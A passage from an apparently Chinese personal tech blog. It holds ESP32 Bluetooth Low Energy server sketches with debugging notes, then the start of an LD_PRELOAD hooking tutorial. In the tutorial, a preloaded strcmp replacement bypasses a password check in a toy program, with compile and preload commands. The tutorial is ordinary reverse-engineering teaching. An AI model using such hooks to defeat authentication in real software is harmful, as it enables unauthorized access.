Ported to Arduino ESP32 by Evandro Copercini</span><br><span class="line">    updates by chegewara</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;BLEDevice.h&gt;</span><br><span class="line">#include &lt;BLEUtils.h&gt;</span><br><span class="line">#include &lt;BLEServer.h&gt;</span><br><span class="line"></span><br><span class="line">// See the following for generating UUIDs:</span><br><span class="line">// https://www.uuidgenerator.net/</span><br><span class="line"></span><br><span class="line">#define SERVICE_UUID        &quot;4fafc201-1fb5-459e-8fcc-c5c9c331914b&quot;</span><br><span class="line">#define CHARACTERISTIC_UUID &quot;beb5483e-36e1-4688-b7f5-ea07361b26a8&quot;</span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line">  Serial.begin(115200);</span><br><span class="line">  Serial.println(&quot;Starting BLE work!&quot;);</span><br><span class="line"></span><br><span class="line">  BLEDevice::init(&quot;iqiqiya&quot;);</span><br><span class="line">  BLEServer *pServer = BLEDevice::createServer();</span><br><span class="line">  BLEService *pService = pServer-&gt;createService(SERVICE_UUID);</span><br><span class="line">  BLECharacteristic *pCharacteristic = pService-&gt;createCharacteristic(</span><br><span class="line">                                         CHARACTERISTIC_UUID,</span><br><span class="line">                                         BLECharacteristic::PROPERTY_READ |</span><br><span class="line">                                         BLECharacteristic::PROPERTY_WRITE</span><br><span class="line">                                       );</span><br><span class="line"></span><br><span class="line">  pCharacteristic-&gt;setValue(&quot;Hello World says Neil&quot;);</span><br><span class="line">  pService-&gt;start();</span><br><span class="line">  // BLEAdvertising *pAdvertising = pServer-&gt;getAdvertising();  // this still is working for backward compatibility</span><br><span class="line">  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();</span><br><span class="line">  pAdvertising-&gt;addServiceUUID(SERVICE_UUID);</span><br><span class="line">  pAdvertising-&gt;setScanResponse(true);</span><br><span class="line">  pAdvertising-&gt;setMinPreferred(0x06);  // functions that help with iPhone connections issue</span><br><span class="line">  pAdvertising-&gt;setMinPreferred(0x12);</span><br><span class="line">  BLEDevice::startAdvertising();</span><br><span class="line">  Serial.println(&quot;Characteristic defined! Now you can read it in your phone!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line">  // put your main code here, to run repeatedly:</span><br><span class="line">  delay(2000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="开发记录1"><a href="#开发记录1" class="headerlink" title="开发记录1"></a>开发记录1</h3><p>创建一个蓝牙设备，以便手机蓝牙可以扫描的到，相关信息在注释里可以看的到。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;BLEDevice.h&gt; // 引入相关库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 声明一个蓝牙设备对象</span><br><span class="line">// 作为服务器使用的时候还需要开启Advertisiting广播才能让别人通道蓝牙扫描发现你</span><br><span class="line"></span><br><span class="line">void setup()&#123;</span><br><span class="line">  BLEDevice::init(&quot;HelloWorldBLE&quot;);  // 填写自身对外显示的蓝牙设备名称，并初始化蓝牙功能</span><br><span class="line">  BLEDevice::startAdvertising();     // 开启Advertising 广播</span><br><span class="line">&#125;</span><br><span class="line">void loop()&#123;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>


<h3 id="开发记录2"><a href="#开发记录2" class="headerlink" title="开发记录2"></a>开发记录2</h3><p>作为服务器使用还需要在上面的基础上将蓝牙设备指定为Server（服务器）使用。Server可以传入一组回调函数，分别会在有客户端设备接入时和断开连接时触发。 在有设备接入后Advertising广播会被停止，所以要在设备断开连接时重新开启广播，可以通过此处的回调函数知道设备是否断开连接。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;BLEDevice.h&gt; // 引入相关库</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// 作为服务器使用还需要在上面的基础上将蓝牙设备指定为Server（服务器）使用。</span><br><span class="line">// Server可以传入一组回调函数，分别会在有客户端设备接入时和断开连接时触发。 </span><br><span class="line">// 在有设备接入后Advertising广播会被停止，所以要在设备断开连接时重新开启广播，</span><br><span class="line">// 可以通过此处的回调函数知道设备是否断开连接。</span><br><span class="line"></span><br><span class="line">class MyServerCallbacks: public BLEServerCallbacks&#123;</span><br><span class="line"></span><br><span class="line">  void onConnect(BLEServer * pServer)&#123;</span><br><span class="line">      Serial.println(&quot;现在有设备接入~&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line">  void onDisconnect(BLEServer * pServer)&#123;</span><br><span class="line">      Serial.println(&quot;现在有设备断开连接~&quot;);</span><br><span class="line">      // 在有设备接入后Advertising 广播会被停止，所以要在设备断开连接时重新开启广播</span><br><span class="line">      // 不然的话只有重启esp32 才能重新搜到</span><br><span class="line">      pServer-&gt;startAdvertising();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">void setup()&#123;</span><br><span class="line">  Serial.begin(115200);</span><br><span class="line">  Serial.println();</span><br><span class="line">  BLEDevice::init(&quot;HelloWorldBLEServer&quot;);  // 填写自身对外显示的蓝牙设备名称，并初始化蓝牙功能</span><br><span class="line">  BLEServer *pServer = BLEDevice::createServer(); // 创建服务器</span><br><span class="line">  pServer-&gt;setCallbacks(new MyServerCallbacks()); // 绑定回调函数</span><br><span class="line">  BLEDevice::startAdvertising();     // 开启Advertising 广播</span><br><span class="line">&#125;</span><br><span class="line">void loop()&#123;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230815231514350.png"></p>
<h3 id="开发记录3"><a href="#开发记录3" class="headerlink" title="开发记录3"></a>开发记录3</h3><p>创建一个服务Service</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;BLEDevice.h&gt; // 引入相关库</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">#define SERVICE_UUID1 &quot;4fafc201-1fb5-459e-8fcc-c5c9c331914b&quot; // 自定义UUID</span><br><span class="line">#define SERVICE_UUID2 &quot;0000180F-0000-1000-8000-00805F9B34FB&quot; // 0x180F是蓝牙技术联盟定义的Battery Service的16-bit UUID</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void setup()&#123;</span><br><span class="line">  Serial.begin(115200);</span><br><span class="line">  Serial.println();</span><br><span class="line">  BLEDevice::init(&quot;HelloWorld_Battery&quot;);  // 填写自身对外显示的蓝牙设备名称，并初始化蓝牙功能</span><br><span class="line">  BLEServer *pServer = BLEDevice::createServer(); // 创建服务器</span><br><span class="line">  BLEService *pService1 = pServer-&gt;createService(SERVICE_UUID1);  // 创建服务</span><br><span class="line">  pService1-&gt;start();  // 启动服务</span><br><span class="line">  BLEService *pService2 = pServer-&gt;createService(SERVICE_UUID2);</span><br><span class="line">  pService2-&gt;start();</span><br><span class="line">  </span><br><span class="line">  BLEDevice::startAdvertising();     // 开启Advertising 广播</span><br><span class="line">&#125;</span><br><span class="line">void loop()&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230816224907026.png"></p>
<h3 id="开发记录4"><a href="#开发记录4" class="headerlink" title="开发记录4"></a>开发记录4</h3><p>这段代码，设置characteristic 中设置值，可以在BLE调试助手中看到，可以读取Characteristic 的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;BLEDevice.h&gt; // 引入相关库</span><br><span class="line"></span><br><span class="line">#define SERVICE_UUID &quot;4fafc201-1fb5-459e-8fcc-c5c9c331914b&quot;</span><br><span class="line">#define CHARACTERISTIC_UUID1 &quot;beb5483e-36e1-4688-b7f5-ea07361b26a8&quot; // 自定义UUID</span><br><span class="line">#define CHARACTERISTIC_UUID2 &quot;00002A23-0000-1000-8000-00805F9B34FB&quot; // 0x2A23是蓝牙技术联盟定义的System ID Characteristic的16-bit UUID</span><br><span class="line"></span><br><span class="line">void setup()&#123;</span><br><span class="line">  Serial.begin(115200);</span><br><span class="line">  Serial.println();</span><br><span class="line">  BLEDevice::init(&quot;HelloWorld_Characteristic&quot;);  // 填写自身对外显示的蓝牙设备名称，并初始化蓝牙功能</span><br><span class="line">  BLEServer *pServer = BLEDevice::createServer(); // 创建服务器</span><br><span class="line">  BLEService *pService = pServer-&gt;createService(SERVICE_UUID);  // 创建服务</span><br><span class="line">  BLECharacteristic *pCharacteristic1 = pService-&gt;createCharacteristic( // 创建特征</span><br><span class="line">                                                      CHARACTERISTIC_UUID1,</span><br><span class="line">                                                      BLECharacteristic::PROPERTY_READ|</span><br><span class="line">                                                      BLECharacteristic::PROPERTY_WRITE</span><br><span class="line">                                                      );</span><br><span class="line">  BLECharacteristic *pCharacteristic2 = pService-&gt;createCharacteristic(</span><br><span class="line">                                                      CHARACTERISTIC_UUID2,</span><br><span class="line">                                                      BLECharacteristic::PROPERTY_NOTIFY</span><br><span class="line">                                                      );</span><br><span class="line">  pCharacteristic1-&gt;setValue(&quot;Hello World&quot;);  // 设置该Characteristic的value值</span><br><span class="line">                                             // 如果客户端连上设备后没有任何写入的情况下</span><br><span class="line">  </span><br><span class="line">  pService-&gt;start();                 // 启动服务</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  BLEDevice::startAdvertising();     // 开启Advertising 广播</span><br><span class="line">&#125;</span><br><span class="line">void loop()&#123;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="开发记录5"><a href="#开发记录5" class="headerlink" title="开发记录5"></a>开发记录5</h3><p>Characteristic主动向客户端发送value 的值，但实际测试并没有主动发送。需要读取才有数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;BLEDevice.h&gt; // 引入相关库</span><br><span class="line">#include &lt;BLE2902.h&gt;</span><br><span class="line"></span><br><span class="line">#define SERVICE_UUID &quot;4fafc201-1fb5-459e-8fcc-c5c9c331914b&quot;</span><br><span class="line">#define CHARACTERISTIC_UUID1 &quot;beb5483e-36e1-4688-b7f5-ea07361b26a8&quot; // 自定义UUID</span><br><span class="line">#define CHARACTERISTIC_UUID2 &quot;00002A23-0000-1000-8000-00805F9B34FB&quot; // 0x2A23是蓝牙技术联盟定义的System ID Characteristic的16-bit UUID</span><br><span class="line"></span><br><span class="line">BLECharacteristic* pCharacteristic1 = NULL;</span><br><span class="line"></span><br><span class="line">bool deviceConnected = false;</span><br><span class="line">uint32_t value = 0;</span><br><span class="line"></span><br><span class="line">class MyServerCallbacks: public BLEServerCallbacks&#123;</span><br><span class="line">  </span><br><span class="line">    void onConnect(BLEServer* pServer)&#123;</span><br><span class="line">        deviceConnected = true;</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">    void onDisconnect(BLEServer* pServer)&#123;</span><br><span class="line">        deviceConnected = false;</span><br><span class="line">      &#125;; </span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">void setup()&#123;</span><br><span class="line">  Serial.begin(115200);</span><br><span class="line">  Serial.println();</span><br><span class="line">  BLEDevice::init(&quot;Characteristic_Send&quot;);  // 填写自身对外显示的蓝牙设备名称，并初始化蓝牙功能</span><br><span class="line">  BLEServer *pServer = BLEDevice::createServer(); // 创建服务器</span><br><span class="line">  BLEService *pService = pServer-&gt;createService(SERVICE_UUID);  // 创建服务</span><br><span class="line">  pCharacteristic1 = pService-&gt;createCharacteristic( // 创建特征</span><br><span class="line">                                                      CHARACTERISTIC_UUID1,</span><br><span class="line">                                                      BLECharacteristic::PROPERTY_READ|</span><br><span class="line">                                                      BLECharacteristic::PROPERTY_WRITE</span><br><span class="line">                                                      );</span><br><span class="line">  BLECharacteristic *pCharacteristic2 = pService-&gt;createCharacteristic(</span><br><span class="line">                                                      CHARACTERISTIC_UUID2,</span><br><span class="line">                                                      BLECharacteristic::PROPERTY_NOTIFY</span><br><span class="line">                                                      );</span><br><span class="line">  pCharacteristic1 -&gt; addDescriptor(new BLE2902());</span><br><span class="line">  pServer -&gt;setCallbacks(new MyServerCallbacks());</span><br><span class="line">  </span><br><span class="line">  //pCharacteristic1-&gt;setValue(&quot;Hello World&quot;);  // 设置该Characteristic的value值</span><br><span class="line">                                             // 如果客户端连上设备后没有任何写入的情况下</span><br><span class="line">  </span><br><span class="line">  pService-&gt;start();                 // 启动服务</span><br><span class="line">  BLEDevice::startAdvertising();     // 开启Advertising 广播</span><br><span class="line">&#125;</span><br><span class="line">void loop()&#123;</span><br><span class="line"></span><br><span class="line">  if(deviceConnected)&#123;</span><br><span class="line">      pCharacteristic1-&gt;setValue((uint8_t*)&amp;value,4);  // 设置value值</span><br><span class="line">      pCharacteristic1-&gt;notify(); // 使用notify 方法向客户端发送数据，也可以使用indicate 方法</span><br><span class="line">      value++;</span><br><span class="line">    &#125;</span><br><span class="line">    delay(2000);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>问题1：esp32 插上电脑，电脑端不显示串口信息。</p>
<p>解决： 有的USB-micro 线只有电源功能，而没有串口转换功能。</p>
<p>问题2：找到实例代码，进行编译得时候，显示如下错误，这个错误是因为 ArduinoBLE 的库的问题</p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230806221449861.png"></p>
<p>解决：在安装库的时候安装了最新的版本，后面换成这个就可以编译了。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230806222114730.png"></p>
<p>问题3： 尝试使用ArduinoBLE 库来开发的时候，编译会报如下的错误<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230815223954076.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Error while detecting libraries included by C:\Users\TigerHu\Documents\Arduino\libraries\ArduinoBLE\src\utility\HCIUartTransport.cpp</span><br><span class="line"></span><br><span class="line">警告： ArduinoBLE 库要求运行在 samd, megaavr, mbed, apollo3, mbed_nano, mbed_portenta, mbed_nicla 架构()，可能与你现在运行在 esp32 架构上的开发板()不兼容。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解决3:  是因为ArduinoBLE库目前不支持esp32架构，该库只支持运行在指定的硬件平台（如<code>samd</code>、<code>megaavr</code>等）上，而ESP32开发板属于不支持的架构。<br>如果您想在 ESP32 上使用 BLE 功能，可以考虑使用其他适用于 ESP32 的 BLE 库，例如 ESP32 BLE Arduino 库或 NimBLE-Arduino 库。您可以通过 Arduino 库管理器在 Arduino IDE 中搜索并安装这些库。</p>
<h2 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Naisu_kun/article/details/115958024">https://blog.csdn.net/Naisu_kun/article/details/115958024</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/espressif/arduino-esp32/tree/master/libraries/BLE">https://github.com/espressif/arduino-esp32/tree/master/libraries/BLE</a><br>esp32 蓝牙API<br><a target="_blank" rel="noopener" href="https://docs.espressif.com/projects/esp-idf/zh_CN/latest/esp32/api-reference/bluetooth/index.html">https://docs.espressif.com/projects/esp-idf/zh_CN/latest/esp32/api-reference/bluetooth/index.html</a><br>玩转esp32 + arduino 开发环境搭建<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/finedayforu/article/details/108464784">https://blog.csdn.net/finedayforu/article/details/108464784</a></p>
<p>视频教学<br>bilibili《# ESP32蓝牙开发及项目实战：BLE蓝牙键盘、蓝牙鼠标、蓝牙手机自》</p>
<p>轻松易懂 arduino 低功耗 BLE 蓝牙通信<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/tiandiren111/article/details/117829463">https://blog.csdn.net/tiandiren111/article/details/117829463</a></p>
<p>代码用到的库<br><a target="_blank" rel="noopener" href="https://github.com/nkolban/ESP32_BLE_Arduino/blob/master/src/BLEServer.h">https://github.com/nkolban/ESP32_BLE_Arduino/blob/master/src/BLEServer.h</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/nkolban/ESP32_BLE_Arduino/blob/master/src/BLEServer.h">https://github.com/nkolban/ESP32_BLE_Arduino/blob/master/src/BLEServer.h</a></p>
<p>蓝牙灯泡hack<br><a target="_blank" rel="noopener" href="https://www.instructables.com/Reverse-Engineering-Smart-Bluetooth-Low-Energy-Dev/">https://www.instructables.com/Reverse-Engineering-Smart-Bluetooth-Low-Energy-Dev/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://tig3rhu.github.io/2023/12/18/45__%E8%93%9D%E7%89%99%20sniff%20&%20CTF/" data-id="clqapur2d0000rsvbdj1yfe4p" data-title="蓝牙sniff&amp;CTF&amp;develop" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-22_使用LD_PROLOAD_进行hook" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/12/18/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook/" class="article-date">
  <time class="dt-published" datetime="2023-12-18T09:19:56.649Z" itemprop="datePublished">2023-12-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/12/18/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook/">Linux 使用LD_PRELOAD 进行hook</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="使用LD-PRELOAD-进行hook"><a href="#使用LD-PRELOAD-进行hook" class="headerlink" title="使用LD_PRELOAD 进行hook"></a>使用LD_PRELOAD 进行hook</h1><p>本文介绍了LD_PRELOAD特性，以及它如何对动态链接的可执行文件进行逆向工程。这种技术允许你劫持函数&#x2F;注入代码来操纵程序流。</p>
<h2 id="0x01-什么是LD-PRELOAD"><a href="#0x01-什么是LD-PRELOAD" class="headerlink" title="0x01 什么是LD_PRELOAD"></a>0x01 什么是LD_PRELOAD</h2><p>LD_PRELOAD 是Linux系统的一个环境变量，它可以影响程序的运行时的链接，允许定义在程序运行前优先加载的动态链接库。</p>
<p>这个功能主要是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>
<p>一方面，我们可以利用此功能来使用自己的或者更好的函数（不需要别人的源码）。</p>
<p>另一方面，我们也可以向别人的程序注入程序，从而达到特定的目的。</p>
<p>LD_PRELOAD用于动态库的加载，动态库加载的优先级最高，一般情况下，其加载顺序位</p>
<blockquote>
<p>LD_PRELOAD &gt; LD_LIBRARY_PATH &gt;  &#x2F;etc&#x2F;ld.so.cache &gt; &#x2F;lib &gt; &#x2F;usr&#x2F;lib</p>
</blockquote>
<p>程序中我们经常要调用一些外部的函数，以open() 和 execve()为例，如果我们自定义这两个函数，把它编译成动态库后，通过LD_PRELOAD加载，当程序中调用open函数时，调用的其实是我们自定义的函数。</p>
<p>Linux 用的都是glibc ，有一个叫libc.so.6库文件，这几乎是Linux 命令的动态链接库，其中也有标准C的各种函数</p>
<h2 id="0x02-什么是程序链接"><a href="#0x02-什么是程序链接" class="headerlink" title="0x02 什么是程序链接"></a>0x02 什么是程序链接</h2><p>程序的链接主要有以下三种：</p>
<ul>
<li>静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。</li>
<li>装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接</li>
<li>运行时动态链接：源程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。</li>
</ul>
<p>对于动态链接来说，需要动态链接库，起作用在于当动态库中的函数发生变化来说，对于可执行程序是透明的，可执行程序无需重新编译，方便程序的发布&#x2F;维护&#x2F;更新，但是由于程序是运行时动态加载，这就存在一个问题，假如程序动态加载的函数是恶意的，就有可能导致一些非预期的执行结果或者绕过某些安全设置。</p>
<h2 id="什么是HOOK"><a href="#什么是HOOK" class="headerlink" title="什么是HOOK"></a>什么是HOOK</h2><p>HOOK(钩子） 通过拦截函数调用，消息或软件组件之间传递的时间来改变或增强操作系统，应用程序或其他软件组件的行为</p>
<h3 id="HOOK-使用场景"><a href="#HOOK-使用场景" class="headerlink" title="HOOK 使用场景"></a>HOOK 使用场景</h3><h4 id="程序开发"><a href="#程序开发" class="headerlink" title="程序开发"></a>程序开发</h4><p>可以在程序开发的时候hook一些运行时的信息</p>
<h4 id="Windows-Linux-Mac-Hook"><a href="#Windows-Linux-Mac-Hook" class="headerlink" title="Windows&#x2F;Linux&#x2F;Mac Hook"></a>Windows&#x2F;Linux&#x2F;Mac Hook</h4><h4 id="Android-IOS-Hook"><a href="#Android-IOS-Hook" class="headerlink" title="Android&#x2F;IOS Hook"></a>Android&#x2F;IOS Hook</h4><p>在脱壳的时候都会使用Hook</p>
<hr>
<h2 id="title-使用LD-PRELOAD进行hook"><a href="#title-使用LD-PRELOAD进行hook" class="headerlink" title="title: 使用LD_PRELOAD进行hook"></a>title: 使用LD_PRELOAD进行hook</h2><h4 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h4><p>在固件模拟的时候在hook一些硬件需要的配置  </p>
<h2 id="0x03-LD-PRELOAD-进行HOOK"><a href="#0x03-LD-PRELOAD-进行HOOK" class="headerlink" title="0x03 LD_PRELOAD 进行HOOK"></a>0x03 LD_PRELOAD 进行HOOK</h2><p>由于LD_PRELOAD可以指定在程序运行前优先加载动态链接库，那我们可以重写程序运行过程中所调用的函数并编译成动态链接库文件，然后通过执行LD_PRELOAD让程序优先加载这个恶意的动态链接库，最后当程序再次运行时便会加载动态链接库中的恶意函数。具体操作步骤如下：</p>
<ol>
<li>定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等。</li>
<li>将包含替换函数的源码编译为动态链接库</li>
<li>通过命令 export LD_PRELOAD&#x3D;”库文件路径”，设置要优先替换动态链接库即可。</li>
<li>替换结束，要还原函数的调用关系，用命令uset LD_PRELOAD解除，或者 export LD_PRELOAD&#x3D;NULL 卸载库。</li>
</ol>
<p>使用LD_PRELOAD 进行hook 有个限制：只能hook 动态链接的库，对静态链接的库是无效的，因为静态链接的代码都写到可执行文件了。</p>
<blockquote>
<p>可以使用 man 命令查看函数原型和定义，比如 man  strcmp </p>
</blockquote>
<h2 id="0x04-hook-案例1"><a href="#0x04-hook-案例1" class="headerlink" title="0x04 hook 案例1"></a>0x04 hook 案例1</h2><p>passcheck.c ， 这里来hook strcmp 函数，绕过密码的验证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    char passwd[] = &quot;password&quot;;</span><br><span class="line">    if (argc &lt; 2) &#123;</span><br><span class="line">        printf(&quot;usage: %s &lt;given-password&gt;\n&quot;, argv[0]);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!strcmp(passwd, argv[1])) &#123;</span><br><span class="line">        printf(&quot;\033[0;32;32mPassword Correct!\n\033[m&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;\033[0;32;31mPassword Wrong!\n\033[m&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126221603854.png" alt="image-20211126221603854"></p>
<p>上面的代码使用到了标准C函数strcmp函数来进行比较，这是一个外部函数。下面来尝试一下重新编写一个strcmp同名的函数，并编译成动态链接库，实现劫持原函数的功能。</p>
<p>hook_strcmp.c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int strcmp(const char *s1, const char *s2) &#123;</span><br><span class="line">    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC hook_strcmp.c -o hook_strcmp.so</span><br></pre></td></tr></table></figure>

<h3 id="问题1（已解决）"><a href="#问题1（已解决）" class="headerlink" title="问题1（已解决）"></a>问题1（已解决）</h3><p>运行时出现如下错误，看样子是编译的问题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/t/learn_LD_PRELOAD&gt; LD_PRELOAD=/hook_strcmp.so ./passcheck paa</span><br><span class="line">ERROR: ld.so: object &#x27;/hook_strcmp.so&#x27; from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">Password Wrong!</span><br></pre></td></tr></table></figure>

<p>但是使用export LD_PRELOAD&#x3D;”hook_strcmp.so”可以成功hook</p>
